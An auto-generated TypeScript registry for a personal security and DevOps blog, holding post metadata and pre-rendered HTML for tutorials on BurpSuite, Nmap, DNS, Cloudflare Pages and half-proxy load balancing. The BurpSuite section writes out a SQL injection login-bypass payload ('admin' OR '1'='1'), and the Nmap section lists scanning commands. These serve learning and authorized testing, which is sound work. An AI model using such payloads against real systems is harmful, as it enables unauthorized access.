// Auto-generated by scripts/generate-content-registry.mjs
// Do not edit manually. Run "node scripts/generate-content-registry.mjs" to regenerate.

export interface RegistryEntry {
  slug: string;
  title: string;
  date: string;
  tags: string[];
  excerpt: string;
  type: string;
  category: string;
}

export const CONTENT_ENTRIES: RegistryEntry[] = [{"slug":"abliteration-model-variants","title":"Abliteration — what HauhauCS and Heretic models actually are","date":"2026-05-16","tags":[],"excerpt":"What abliteration does to a model, why uncensored variants exist, what HauhauCS-Aggressive and Heretic model families are, and the actual tradeoffs of using them","type":"til","category":"AI/ML"},{"slug":"ai-agents-goose","title":"AI Agents — Goose, Hermes, and the Octopus Theory","date":"2026-05-16","tags":[],"excerpt":"What AI agents actually are, how Goose works under the hood, what MCP extensions do for agents, and why the octopus analogy actually explains it better than any technical description","type":"til","category":"AI/ML"},{"slug":"llama-swap-router","title":"llama-swap vs llama.cpp router mode — two ways to juggle models on one GPU","date":"2026-05-16","tags":[],"excerpt":"When you have two models and not enough VRAM for both, you need model switching. I tried llama-swap (didn't work), discovered llama.cpp's native router mode (does work), and learned why the distinction matters.","type":"til","category":"AI/ML"},{"slug":"llm-vram-inference","title":"Why LLMs eat VRAM and what actually happens during inference","date":"2026-05-16","tags":[],"excerpt":"Finally understood what inference actually means, why GPU VRAM is the bottleneck, and why my 64GB of RAM did almost nothing to help when the model was too big","type":"til","category":"AI/ML"},{"slug":"lora-qlora-finetuning","title":"LoRA and QLoRA — fine-tuning LLMs without a supercomputer","date":"2026-05-16","tags":[],"excerpt":"Fine-tuning always sounded like a thing only big companies could do. LoRA changed that. Here's what LoRA and QLoRA actually are and how they let you customize models on consumer hardware.","type":"til","category":"AI/ML"},{"slug":"mcp-understood","title":"MCP — how AI agents grow new limbs","date":"2026-05-16","tags":[],"excerpt":"Model Context Protocol explained — what the server and client actually are, why it exists, and how it turned my LLM from a chatbot into something that can actually run commands","type":"til","category":"AI/ML"},{"slug":"moe-vs-dense-llms","title":"MoE vs Dense — why a 27B model beat a 122B model on my hardware","date":"2026-05-16","tags":[],"excerpt":"Mixture of Experts sounds impressive and the parameter count looks better on paper. But I spent a week learning the hard way that bigger numbers don't always mean better results.","type":"til","category":"AI/ML"},{"slug":"ollama-llamacpp-vllm","title":"Ollama vs llama.cpp vs vLLM — picking your LLM serving layer","date":"2026-05-16","tags":[],"excerpt":"Three different ways to run LLMs locally and when each one makes sense. I tried all three approaches and ended up on llama.cpp for reasons that only became obvious after a lot of pain.","type":"til","category":"AI/ML"},{"slug":"rag-vs-finetuning","title":"RAG vs Fine-tuning","date":"2026-05-16","tags":["RAG","fine-tuning","Qdrant","vector database","embeddings","LLM"],"excerpt":"Why I built a Qdrant RAG pipeline instead of fine-tuning on CVEs, and the actual tradeoffs.","type":"til","category":"AI/ML"},{"slug":"tokens-quantization-context","title":"Tokens, quantization, and context windows — what they actually mean","date":"2026-05-16","tags":[],"excerpt":"I kept nodding along when people said 'tokens' and 'quantization' without actually knowing what they meant. Here's what they actually are.","type":"til","category":"AI/ML"},{"slug":"enumerating","title":"Infrastructure Enumeration: Mapping the Target","date":"2026-03-25","tags":[],"excerpt":"Before you can hack a target, you must understand it. Learn the principles of infrastructure enumeration, from DNS and cloud resources to OSINT and staff profiling.","type":"blog","category":"Reconnaissance"},{"slug":"Enumeration/passive-enumeration","title":"Passive & Active Enumeration Checklist","date":"2026-03-22","tags":["cpts","red-team","bug hunt","recon","subdomain","dns","shodan","dorking","osint"],"excerpt":"Map the target's footprint without setting off alarms — from passive DNS to active service discovery. Phased recon: passive → semi-passive → active.","type":"checklist","category":"Reconnaissance"},{"slug":"nmap-for-cpts","title":"CPTS: Network Enumeration with Nmap","date":"2026-03-15","tags":["Red Team","Hack The Box","Nmap","Evasion","CPTS"],"excerpt":"Comprehensive guide to mastering Nmap for Hack The Box CPTS. Covers Host Discovery, UDP scanning headaches, NSE scripting, Firewall/IDS evasion, and custom ZSH automation for extracting ports.","type":"blog","category":"Penetration Testing"},{"slug":"automate-nmap-port-copy-to-clipboard","title":"Automating Nmap Port Extraction to Clipboard","date":"2026-03-10","tags":["nmap","zsh","automation","pentesting","workflow"],"excerpt":"A ZSH function that extracts open ports from Nmap discovery scans and copies them to clipboard — saving precious seconds between recon phases.","type":"til","category":"Automation"},{"slug":"Recon/nmap-network-enum","title":"Nmap Engagement & Evasion Strategy","date":"2026-03-10","tags":["cpts","red-team","nmap","port scanning","evasion","recon"],"excerpt":"A systematic Nmap workflow — host discovery to service enumeration to firewall evasion. Run these phases in order.","type":"checklist","category":"Reconnaissance"},{"slug":"docker-compose-ai-agent","title":"Docker Compose file to run open WebUI and AI Agents","date":"2026-01-01","tags":[],"excerpt":"How to run open WebUI and download gguf files to run AI Agents","type":"til","category":"DevOps"},{"slug":"HackTheBox/htb-cap","title":"HTB - Cap Walkthrough","date":"2025-12-10","tags":["htb","walkthrough","idor","pcap","linux-capabilities","ftp"],"excerpt":"Walkthrough checklist for the HackTheBox Cap machine — IDOR, PCAP analysis, FTP credentials, and Linux Capability exploitation.","type":"checklist","category":"Walkthrough"},{"slug":"SQLInjection-Labs/sqlmap","title":"SQLMap Command Reference","date":"2025-06-20","tags":["sqlmap","sql injection","pentesting","database","enumeration"],"excerpt":"SQLMap from basic scans to full database takeover — flags, techniques, and real engagement examples.","type":"cheatsheet","category":"Web Security"},{"slug":"Enumeration/nmap","title":"Nmap Command Reference","date":"2025-06-15","tags":["nmap","reconnaissance","cpts","htb","red-team","port scanning"],"excerpt":"Nmap scanning techniques, host discovery, service enumeration, and NSE scripting — the definitive recon cheatsheet.","type":"cheatsheet","category":"Reconnaissance"},{"slug":"DevOps/docker","title":"Docker Command Reference","date":"2025-06-10","tags":["docker","containers","devops","images","volumes"],"excerpt":"Essential Docker commands for building, running, and managing containers — from hello-world to production deployments.","type":"cheatsheet","category":"DevOps"},{"slug":"SQLInjection-Labs/SQLi-Lab1","title":"Portswigger SQL Injection Lab 1","date":"2025-05-31","tags":[],"excerpt":"SQL injection vulnerability in WHERE clause allowing retrieval of hidden data","type":"cheatsheet","category":"Web Security"},{"slug":"SQLInjection-Labs/SQLi-Lab2","title":"Portswigger SQL Injection Lab 2","date":"2025-05-31","tags":[],"excerpt":"SQL injection vulnerability allowing login bypass","type":"cheatsheet","category":"Web Security"},{"slug":"sql-injection-101","title":"SQL Injection 101","date":"2025-03-12","tags":["SQL Injection","Web Security","Penetration Testing","OWASP"],"excerpt":"From basic concepts to data extraction — everything you need to understand SQL injection attacks and how to prevent them.","type":"blog","category":"Web Security"},{"slug":"password-found-in-breach","title":"How Password Managers Detect Breached Passwords Without Seeing Yours","date":"2025-01-15","tags":["password security","hashing","privacy","k-anonymity","cybersecurity"],"excerpt":"How password managers instantly check if your password was breached — without ever seeing your actual password or storing a breach database locally.","type":"til","category":"Security"},{"slug":"dns101","title":"DNS for Dummies: Part 1","date":"2025-01-12","tags":["DNS"],"excerpt":"The journey to mastering DNS starts here. Let's discover why DNS is the internet's backbone and its role in enabling modern-day connectivity.","type":"blog","category":"Networking"},{"slug":"f5_software_update","title":"F5 BigIP Software Update Checklist","date":"2024-12-25","tags":["bigip","firmware update","f5","network"],"excerpt":"Step-by-step checklist for updating firmware on F5 BigIP appliances — from ISO import to traffic verification.","type":"checklist","category":"Network Operations"},{"slug":"hugo-shortcodes","title":"Using Hugo Shortcodes for Enhanced Content","date":"2024-11-15","tags":[],"excerpt":"Today I learned how to use Hugo shortcodes to create reusable content snippets and enhance my markdown files.","type":"til","category":"DevOps"},{"slug":"half-proxy","title":"Understanding Half Proxy","date":"2024-10-01","tags":["Half proxy","Proxy","Load Balancer","Direct Server Return"],"excerpt":"In a half proxy setup, the load balancer intercepts the client's request, forwards it to the server, but the response from the server bypasses the load balancer and is sent directly to the client. This setup is used in specific scenarios where performance gains are desired, but it introduces challenges like asymmetric routing. But what is asymmetric routing?","type":"blog","category":"Networking"},{"slug":"networking-basics-1","title":"TCP/IP and OSI in networking","date":"2024-04-08","tags":[],"excerpt":"Computer networking involves the interconnection of devices and systems for communication and resource sharing, enabling data transfer and access across various networks.","type":"blog","category":"Networking"},{"slug":"learning-python-1","title":"Python: Part 1","date":"2024-04-02","tags":[],"excerpt":"Python is a versatile and high-level language known for its simplicity and readability, widely used in software development, data analysis, web development, and automation tasks.","type":"blog","category":"Programming"},{"slug":"github-basics-1","title":"Git Basics: Part 1","date":"2024-03-24","tags":[],"excerpt":"Git is a powerful version control system with a wide range of capabilities and GitHub is a popular web-based platform that provides hosting for Git repositories.","type":"blog","category":"DevOps"},{"slug":"burpsuite-basics","title":"BurpSuite Basics","date":"2024-03-12","tags":["BurpSuite","Web App Security","Penetration Testing","Proxy","Scanner"],"excerpt":"BurpSuite is the industry standard for web app testing. Here's what it does, how to set it up, and why every pentester needs it.","type":"blog","category":"Web Security"},{"slug":"cloudflare-deployment","title":"Deploying to Cloudflare","date":"2024-02-25","tags":["Static sites","Hosting","Deployment"],"excerpt":"If you are a beginner frontend developer, this is a goldmine for you. Host your website projects for free in cloudflare pages easily and shine infront of your competition in recruitments.","type":"blog","category":"DevOps"},{"slug":"learning-japanese","title":"My path to gain fluency in Japanese","date":"2024-01-18","tags":[],"excerpt":"🔠 Unearth the intricate characters that form the backbone of Japanese writing. Unlock the magic behind each stroke and immerse yourself in the rich history of this captivating script.","type":"blog","category":"Personal"},{"slug":"exploring-nmap","title":"Exploring Nmap — Getting Started","date":"2023-09-28","tags":["Nmap","Port Scanning","Penetration Testing","Enumeration"],"excerpt":"Every hack starts with enumeration. Nmap is the tool. Here's how to install it and run your first scans.","type":"blog","category":"Reconnaissance"},{"slug":"tutorialhell","title":"Breaking Free from Tutorial Overload","date":"2023-09-21","tags":[],"excerpt":"Breaking Free from Tutorial Overload: A simple guide to learning successfully and stop being on a learning treadmill but not moving forward","type":"blog","category":"Career"},{"slug":"DevOps/Git","title":"Git","date":"","tags":[],"excerpt":"is a distributed version control system for tracking changes in code and coordinating work among multiple developers.","type":"cheatsheet","category":"DevOps"},{"slug":"DevOps/Kubernetes","title":"Kubernetes","date":"","tags":[],"excerpt":"is an open-source container orchestration platform that automates the deployment and management of containerized applications.","type":"cheatsheet","category":"DevOps"},{"slug":"Enumeration/Dig_and_NSlookup","title":"Dig and NSlookup","date":"","tags":[],"excerpt":"are used to query nameservers.","type":"cheatsheet","category":"Reconnaissance"},{"slug":"Enumeration/Dorking","title":"Dorking","date":"","tags":[],"excerpt":"are used in search engine queries to find stuffs hiding deep under.","type":"cheatsheet","category":"Reconnaissance"},{"slug":"Enumeration/Enumeration_Tools","title":"Subdomain Enum Tools","date":"","tags":[],"excerpt":"are used to enumerate subdomains.","type":"cheatsheet","category":"Reconnaissance"},{"slug":"Linux/Terminal_and_Shell","title":"Terminal & Shell","date":"","tags":[],"excerpt":"Command line essentials.... navigation, editing, and history shortcuts for Zsh and Ghostty.","type":"cheatsheet","category":"Operating System"},{"slug":"OWASP10","title":"OWASP Top 10","date":"","tags":[],"excerpt":"The OWASP Top 10 is a standard awareness document for developers and web application security teams. It represents a broad consensus about the most critical security risks to web applications.","type":"cheatsheet","category":"General"},{"slug":"Programming/SQL","title":"SQL","date":"","tags":[],"excerpt":"is a domain-specific language for managing and manipulating relational databases.","type":"cheatsheet","category":"Programming"},{"slug":"Programming/python","title":"Python","date":"","tags":[],"excerpt":"is a versatile programming language used for web development, data analysis, artificial intelligence, and automation.","type":"cheatsheet","category":"Programming"}];

// Pre-compiled MDX → HTML strings (no eval needed at runtime)
export const CONTENT_HTML: Record<string, string> = {"burpsuite-basics":"<p>BurpSuite is a proxy that sits between your browser and the target. Every request passes through it. You inspect, modify, replay, and automate. It's the central nervous system of web app pentesting.</p>\n<p><ideanode color=\"blue\"><strong>Free (Community) vs Pro:</strong> Community has Proxy, Repeater, Intruder (throttled), Decoder. Pro adds Scanner (automated vuln detection). For most work, Community is enough.</ideanode></p>\n<h2>The Core Tools</h2>\n<accordion title=\"Proxy — Intercept traffic\" color=\"#0055ff\">\n<p>Burp acts as a man-in-the-middle between browser and server. Configure your browser to use <code>127.0.0.1:8080</code>, install Burp's CA certificate, and every HTTP request flows through the Proxy tab.</p>\n<ul>\n<li><strong>Intercept</strong> — pause and modify requests before they reach the server</li>\n<li><strong>HTTP History</strong> — every request/response logged for analysis</li>\n<li><strong>Scope</strong> — limit to target domain to reduce noise</li>\n</ul>\n</accordion>\n<accordion title=\"Repeater — Manual testing\" color=\"#00cc55\">\n<p>Send a request, modify it, send again. Repeat. The bread and butter of manual testing.</p>\n<pre><code class=\"language-http\">POST /login HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin' OR '1'='1&#x26;password=anything\n</code></pre>\n<p>&#x3C;CopyButton text={`POST /login HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded</p>\n<p>username=admin' OR '1'='1&#x26;password=anything`} label=\"Copy payload\" /></p>\n</accordion>\n<accordion title=\"Intruder — Automate attacks\" color=\"#ff6600\">\n<p>Automated fuzzing. Select positions in a request, load payloads, and fire. Used for:</p>\n<ul>\n<li>Brute-forcing passwords</li>\n<li>Fuzzing parameters for SQLi/XSS</li>\n<li>Enumerating valid usernames</li>\n<li>Testing rate limiting</li>\n</ul>\n</accordion>\n<accordion title=\"Decoder — Encode/decode\" color=\"#7700ff\">\n<p>Base64, URL encoding, HTML entities, hex, etc. Right-click any selected text in Burp → \"Send to Decoder.\"</p>\n</accordion>\n<h2>Setup in 3 Steps</h2>\n<p>&#x3C;Tabs\ntabs={[\n{\nlabel: \"1. Install\",\nchildren: (\n</p><div>\n<p>Download from <a href=\"https://portswigger.net/burp/communitydownload\">PortSwigger</a>. Community Edition is free.</p>\n<pre class=\"font-mono text-sm bg-brutal-black text-brutal-green p-4 overflow-x-auto\">\n{<code>java -jar burpsuite_community.jar</code>}\n</pre>\n</div>\n)\n},\n{\nlabel: \"2. Browser Config\",\nchildren: (\n<div>\n<p>Set browser proxy to <code>127.0.0.1:8080</code>. Install Burp's CA certificate by visiting <code>http://burpsuite</code> in the proxied browser.</p>\n<p class=\"mt-2\">For Firefox: Settings → Network Settings → Manual proxy configuration.</p>\n</div>\n)\n},\n{\nlabel: \"3. Test\",\nchildren: (\n<div>\n<p>Browse any HTTPS site. You should see traffic in Burp's Proxy → HTTP History tab. If nothing shows, your browser proxy isn't configured correctly.</p>\n<p class=\"mt-2\">Turn Intercept ON to pause and modify requests before they reach the server.</p>\n</div>\n)\n}\n]}\ncolor=\"#0055ff\"\n/><p></p>\n<p><brutalbutton color=\"#ffdd00\">Start with Proxy. Master Repeater. Everything else follows.</brutalbutton></p>","cloudflare-deployment":"<h1>Deploying a Static Site to Cloudflare Pages</h1>\n<h2>What is a Static Site?</h2>\n<p>In the world of web development, static sites have been gaining popularity in recent years. A static site is a website where the content is pre-rendered and served as-is to the user, without any dynamic server-side processing. This means that the content of the pages doesn't change based on user input or interaction.</p>\n<p>Static sites are typically faster and more secure than dynamic websites, as they don't require a server-side scripting language (like PHP, Ruby, or Python) to generate the pages on the fly. Instead, the entire site is pre-built and stored as HTML, CSS, and JavaScript files, which can be efficiently delivered to the user's browser.</p>\n<p>This simplicity also makes static sites easier to maintain and scale. Content updates can be as straightforward as pushing changes to a version control system, like Git, and then re-deploying the site. Static sites are, therefore, an excellent choice for many types of web projects, including blogs, company websites, portfolio sites, and even small web applications.</p>\n<h2>What Can and Can't be Hosted for Free on Cloudflare Pages?</h2>\n<p>Cloudflare Pages is a powerful and easy-to-use platform that allows you to host your static sites for free. This makes it an attractive option for developers and individuals who are looking to build and deploy their web projects without incurring significant hosting costs.</p>\n<p>The free plan offered by Cloudflare Pages comes with some notable features and limitations:</p>\n<p><strong>Features:</strong></p>\n<ul>\n<li><strong>Continuous Deployment</strong>: Cloudflare Pages automatically deploys your site whenever you push changes to your Git repository, making it easy to keep your site up-to-date.</li>\n<li><strong>Global CDN</strong>: Your static site is served from Cloudflare's global content delivery network (CDN), ensuring fast load times for your visitors.</li>\n<li><strong>SSL/HTTPS</strong>: Cloudflare Pages provides free SSL/HTTPS support, so your site can be served securely.</li>\n<li><strong>Custom Domains</strong>: While the free plan only supports subdomains of <code>*.pages.dev</code>, you can use your own custom domain if you upgrade to a paid plan.</li>\n</ul>\n<p><strong>Limitations:</strong></p>\n<ul>\n<li><strong>Bandwidth Limit</strong>: The free plan has a monthly bandwidth limit of 100GB, which may be sufficient for many small to medium-sized static sites.</li>\n<li><strong>Build Minutes</strong>: The free plan comes with a monthly build time limit of 500 minutes, which is the amount of time Cloudflare Pages can spend building your site during deployments.</li>\n<li><strong>Custom Domains</strong>: As mentioned, the free plan only supports subdomains of <code>*.pages.dev</code>. If you want to use your own custom domain, you'll need to upgrade to a paid plan.</li>\n</ul>\n<p>It's important to note that the free plan is well-suited for hosting simple, static websites. If you have more advanced requirements, such as increased bandwidth or custom domain support, you may need to consider upgrading to one of Cloudflare's paid plans.</p>\n<h2>Deploying Your Static Site on Cloudflare Pages</h2>\n<p>Deploying your static site on Cloudflare Pages is a straightforward process, even for users with no prior experience. Here's a step-by-step guide to help you get started:</p>\n<blockquote>\n<p>For this demonstration, I have used this very unique <a href=\"https://github.com/Sped0n/bridget\">gallery application</a> made using Solid Js and Hugo.</p>\n</blockquote>\n<ol>\n<li>\n<p><strong>Create a Public Repository</strong>: Your static site must be in a public repository on GitHub or GitLab. This is a requirement for the free Cloudflare Pages plan. If you want help on how to push your code to GitHub, I have got you covered, just <a href=\"https://suhesh.com.np/blog/github-basics-1/\">click here</a>.</p>\n</li>\n<li>\n<p><strong>Open the Cloudflare Dashboard</strong>: Log in to your Cloudflare account and navigate to the dashboard.\n<img src=\"/images/blog/deployment/cloudflare/dashboard.png\" alt=\"Cloudflare Dashboard\"></p>\n</li>\n<li>\n<p><strong>Click \"Create a Project\"</strong>: This will start the process of setting up your new static site project.</p>\n<img src=\"/images/blog/deployment/cloudflare/create-project.png\" alt=\"Create a Project\">\n</li>\n<li>\n<p><strong>Click on \"Workers\" and then \"Pages\"</strong>: This will take you to the Cloudflare Pages section of the dashboard.</p>\n<img src=\"/images/blog/deployment/cloudflare/pages.png\" alt=\"Cloudflare Pages\">\n<p><strong>Connect to Your Git Repository</strong>: Click the \"Connect to Git\" button and select the platform (GitHub or GitLab) where your site's repository is hosted.</p>\n</li>\n<li>\n<p><strong>Choose Your Repository</strong>: Select the repository where your static site is located.</p>\n<img src=\"/images/blog/deployment/cloudflare/choose-repo.png\" alt=\"Choose Repository\">\n</li>\n<li>\n<p><strong>Configure Your Project</strong>: Cloudflare Pages will try to automatically detect the type of framework your site is built with. You can choose a different framework preset if needed.</p>\n<img src=\"/images/blog/deployment/cloudflare/configure-project.png\" alt=\"Configure Project\">\n<p><strong>Click \"Deploy\"</strong>: This will start the deployment process, and your site will be available at a Cloudflare Pages subdomain (e.g., <code>your-site.pages.dev</code>).</p>\n</li>\n<li>\n<p><strong>Deployed</strong>: If your application is deployed without any errors, it should be available under the domain <code>YOUR_PROJECT_NAME.pages.dev</code> in a few moments. You can continue to your project.\n<img src=\"/images/blog/deployment/cloudflare/deployed.png\" alt=\"Deployed\"></p>\n</li>\n</ol>\n<p>During the deployment process, Cloudflare Pages will fetch the code from your Git repository, build your site according to the selected framework preset, and then publish the generated files to its global CDN.</p>\n<ol start=\"8\">\n<li>\n<p><strong>Handling Deployment Errors</strong>:</p>\n<p>Sometimes, the deployment may fail due to various reasons. Here are some common errors you might encounter and how to handle them:</p>\n<img src=\"/images/blog/deployment/cloudflare/error.png\" alt=\"Error\">\n<p>a. <strong>Error in Code - Build Failed</strong>:\nIf there are issues in your code, the deployment process may fail during the build step. In this case, you can fix the errors in your code, push the changes to your Git repository, and then manually retry the deployment by clicking the \"Retry Deployment\" button.</p>\n<p>b. <strong>Large File Size Exceeds Limit</strong>:\nCloudflare Pages has a file size limit, and if your site includes large files (such as high-resolution images or videos), the deployment may fail. To resolve this, you can optimize your assets or consider using a content delivery network (CDN) to serve the large files.</p>\n<p>c. <strong>Unknown Error: Manual Rebuild Fixes It</strong>:\nOccasionally, you may encounter an unknown error during the deployment process. In such cases, manually retrying the deployment by clicking the \"Retry Deployment\" button may resolve the issue.</p>\n<p>d. <strong>Other Errors</strong>:\nDepending on the nature of the error, you may need to consult the deployment logs or seek help from the Cloudflare support team to troubleshoot the issue.</p>\n</li>\n</ol>\n<p>During the deployment process, you can view the deployment logs by clicking on the \"Deployments\" tab in the Cloudflare Pages section of the dashboard. This can help you identify and troubleshoot any issues that may arise.</p>\n<img src=\"/images/blog/deployment/cloudflare/available.png\" alt=\"Available\">\n<p>Once the deployment is complete, you'll be able to access your static site at the provided Cloudflare Pages subdomain. If you need to update your site, simply push your changes to your Git repository, and Cloudflare Pages will automatically rebuild and redeploy your site.</p>\n<h2>Supported Frameworks</h2>\n<p>Cloudflare Pages supports a wide range of static site frameworks and generators, making it a versatile platform for hosting various types of web projects. Here's a table with some of the most popular options:</p>\n<p>| Framework                 | Description                                                                                                                                                                                                                                                    |\n|</p>","dns101":"<h2>Welcome to this <a href=\"/tags/dns/\">DNS Series </a></h2>\n<p>Have you ever wondered what happens when you type a URL like <code>suhesh.com.np</code> in your browser and hit Enter? What magic makes it possible for websites, hosted halfway across the globe, to load in seconds? The answer lies in <strong>DNS</strong>—Domain Name System—the <em>\"contacts app\"</em> of modern Internet.</p>\n<p>Through this blog series we will walk through a exploration of DNS, from its foundational concepts to setting up your own <strong>F5 DNS</strong> solutions learning together along the way. I am aiming this series to:</p>\n<ul>\n<li>Break down the complexities of DNS in an intuitive and engaging way.</li>\n<li>Incorporate hands-on lab walk alongs to solidify our understanding.</li>\n<li>Include quizzes and practical exercises to exercise what we learnt.</li>\n<li>Make this learning journey fun and rewarding!</li>\n</ul>\n<p>Let’s begin this adventure by understanding the basics. In the upcoming posts, we’ll dive deeper into DNS records, security (like DNSSEC), tools such as <code>dig</code> and <code>nslookup</code>, and even scaling DNS using advanced features.</p>","enumerating":"<h1>The Art of Infrastructure Enumeration</h1>\n<p>In cybersecurity, whether you are performing a penetration test, engaging in red teaming, or hunting for bug bounties, the most critical phase is the one where you don't exploit anything at all. This is <strong>Enumeration</strong>.</p>\n<p>Enumeration is a continuous loop of gathering information, analyzing it, and using that new knowledge to gather even more information. It is the process of mapping the attack surface before you strike.</p>\n<blockquote>\n<p><strong>The Treasure Hunter Analogy:</strong></p>\n<p>Imagine you are a treasure hunter. You wouldn't just walk into a jungle with a shovel and start digging random holes. You would waste time, cause a mess, and likely find nothing. Instead, you study old maps, research the terrain, talk to locals, and bring the right tools for the specific environment.</p>\n<p>In cybersecurity, brute-forcing a login page immediately is \"blind digging.\" Enumeration is studying the map.</p>\n</blockquote>","exploring-nmap":"<p>Enumeration is the first real step in any engagement. Before you exploit anything, you need to know what's there. Nmap answers that question.</p>\n<p><ideanode color=\"green\"><strong>Golden rule:</strong> Don't scan targets you don't own without written permission. Network scanning without authorization is illegal in most jurisdictions.</ideanode></p>\n<h2>Installation</h2>\n<p>&#x3C;Tabs\ntabs={[\n{\nlabel: \"Linux\",\nchildren: (\n</p><div>\n<pre class=\"font-mono text-sm bg-brutal-black text-brutal-green p-4 overflow-x-auto\">\n{<code>sudo apt install nmap   # Debian/Ubuntu sudo pacman -S nmap      # Arch sudo dnf install nmap    # Fedora</code>}\n</pre>\n</div>\n)\n},\n{\nlabel: \"Windows\",\nchildren: (\n<div>\n<p>Download from <a href=\"https://nmap.org/download.html\">nmap.org</a> or use winget:</p>\n<pre class=\"font-mono text-sm bg-brutal-black text-brutal-green p-4 overflow-x-auto mt-2\">\n{<code>winget install -e --id Insecure.Nmap</code>}\n</pre>\n</div>\n)\n},\n{\nlabel: \"macOS\",\nchildren: (\n<div>\n<pre class=\"font-mono text-sm bg-brutal-black text-brutal-green p-4 overflow-x-auto\">\n{<code>brew install nmap</code>}\n</pre>\n</div>\n)\n}\n]}\ncolor=\"#00cc55\"\n/><p></p>\n<h2>Your First Scans</h2>\n<accordion title=\"Ping sweep — find live hosts\" color=\"#00cc55\">\n```bash\nnmap -sn 192.168.1.0/24\n```\nSends ICMP echo, TCP SYN to port 443, TCP ACK to port 80, and ICMP timestamp. Shows which IPs respond.\n<copybutton text=\"nmap -sn 192.168.1.0/24\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"Quick port scan\" color=\"#ff2d95\">\n```bash\nnmap -sS -p 1-1000 192.168.1.1\n```\nSYN scan on the top 1000 ports. Fast, stealthy (half-open connections).\n<copybutton text=\"nmap -sS -p 1-1000 192.168.1.1\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"Service version detection\" color=\"#0055ff\">\n```bash\nnmap -sV -p 22,80,443 192.168.1.1\n```\nProbes open ports to determine: service name, version number, OS hints, and sometimes hostname.\n<copybutton text=\"nmap -sV -p 22,80,443 192.168.1.1\" label=\"Copy\">\n</copybutton></accordion>\n<h2>Understanding Output</h2>\n<accordion title=\"Reading scan results\" color=\"#7700ff\">\n<pre><code>PORT     STATE    SERVICE      VERSION\n22/tcp   open     ssh          OpenSSH 8.9p1\n80/tcp   open     http         Apache httpd 2.4.54\n443/tcp  closed   https\n3306/tcp filtered mysql\n</code></pre>\n<ul>\n<li><strong>open</strong> — A service is listening</li>\n<li><strong>closed</strong> — Port accessible but no service</li>\n<li><strong>filtered</strong> — Firewall blocking — can't tell if open or closed</li>\n</ul>\n</accordion>\n<p><brutalbutton color=\"#ffdd00\">Check the full Nmap Cheatsheet →</brutalbutton></p>","github-basics-1":"<h1>Demystifying Git and GitHub for Beginners</h1>\n<p>Welcome, fellow coders! Today, we embark on a journey to explore the powerful tools of Git and GitHub. These essential tools can seem daunting at first, but worry not! We'll be diving into the fundamentals, providing you with a comprehensive and beginner-friendly introduction.</p>\n<h2>Understanding Git and GitHub</h2>\n<p>Before we begin, let's clear up a common misconception: Git and GitHub are not the same. Git is a version control system, while GitHub is a hosting platform for Git repositories. To better understand the differences, let's take a look at the table below:</p>\n<p>| Comparison Point | Git                                                                      | GitHub                                                                                      |\n|</p>","half-proxy":"<h1>How does a half proxy work?</h1>\n<p>In a <strong>half proxy</strong> setup, the load balancer intercepts the client's request, forwards it to the server, but the response from the server <strong>bypasses the load balancer</strong> and is sent directly to the client. This setup is used in specific scenarios where performance gains are desired, but it introduces challenges like asymmetric routing. But what is asymmetric routing?</p>\n<h5>Asymmetric Routing</h5>\n<p>When traffic takes <strong>different paths</strong> on the way to and from the client, that is asymmetric routing and the network devices (e.g., firewalls or routers) may discard the packets, as they expect traffic to follow the same route (both request and response via the load balancer).</p>\n<ol>\n<li><strong>Request Path:</strong> Client → Load Balancer → Server</li>\n<li><strong>Response Path:</strong> Server → Client (bypassing the load balancer)</li>\n</ol>\n<p><strong>Why would the packet be discarded?</strong></p>\n<ul>\n<li>Firewalls or NAT devices maintain a connection table for every session, associating request and response packets. If the response bypasses the original path (the load balancer), the return packets won’t match the expected flow, leading to <strong>packet drops</strong>.</li>\n</ul>\n<h1>Direct Server Return</h1>\n<p>A more optimized version of the half proxy, Direct Server Return (DSR), allows the server to send responses directly to the client but works under specific conditions:</p>\n<ul>\n<li>The load balancer passes the client’s request <strong>without altering</strong> the Layer 3 information (like the source IP address), but <strong>may modify Layer 2 information</strong> (MAC addresses).</li>\n<li><strong>Requirements:</strong>\n<ul>\n<li>The load balancer and server must be in the same Layer 2 domain.</li>\n<li>The server must respond directly to the client by using the client’s IP address as the destination IP, but the server doesn’t change the VIP as the destination MAC address.</li>\n</ul>\n</li>\n</ul>\n<h3>Example</h3>\n<p>Let's take the following:</p>\n<ol>\n<li><strong>Client IP:</strong> <code>192.168.1.10</code></li>\n<li><strong>Load Balancer VIP (Virtual IP):</strong> <code>192.168.2.1</code></li>\n<li><strong>Server IP:</strong> <code>192.168.3.5</code></li>\n</ol>\n<h5>Step by Step Breakdown</h5>\n<ol>\n<li><strong>Client sends a request to the Load Balancer:</strong>\n<ul>\n<li>The client sends a request to the load balancer’s <em>Virtual IP</em> (VIP) at <em>192.168.2.1</em>.</li>\n<li><strong>Client Request:</strong>\n<ul>\n<li>Source IP: <code>192.168.1.10</code></li>\n<li>Destination IP: <code>192.168.2.1</code> (Load Balancer VIP)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>Load Balancer forwards the request to the Server:</strong>\n<ul>\n<li>The load balancer receives the request but does not modify the <em>IP header</em> (it keeps the original source and destination IPs).</li>\n<li>The load balancer forwards the packet to the server by altering the <em>Layer 2 (MAC address)</em> so the server receives the packet.</li>\n<li><strong>Forwarded Request to the Server:</strong>\n<ul>\n<li>Source IP: <code>192.168.1.10</code> (Client)</li>\n<li>Destination IP: <code>192.168.2.1</code> (VIP)</li>\n<li>Server processes the request because it recognizes the VIP as one of its assigned IPs.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>Server responds directly to the Client:</strong>\n<ul>\n<li>Instead of sending the response back to the load balancer, the server responds directly to the client.</li>\n<li>The server uses the client’s IP as the destination IP in the response.</li>\n<li><strong>Server Response:</strong>\n<ul>\n<li>Source IP: <code>192.168.3.5</code> (Server)</li>\n<li>Destination IP: <code>192.168.1.10</code> (Client)</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<p>This means <em>the response bypasses the load balancer</em>, improving performance by reducing the load balancer's involvement in the return path.</p>\n<h3>How and Whys...</h3>\n<p><strong>A. Why would the server recognize VIP as its own IP?</strong>\nIn a Direct Server Return (DSR) setup, the server recognizes the Virtual IP (VIP) as one of its own IPs because the VIP is configured on the server as a loopback or secondary IP address. This configuration is crucial for DSR to function properly, allowing the server to respond directly to client requests while keeping the VIP intact.</p>\n<ol>\n<li><strong>VIP Configuration on the Server</strong>:\n<ul>\n<li>In DSR, 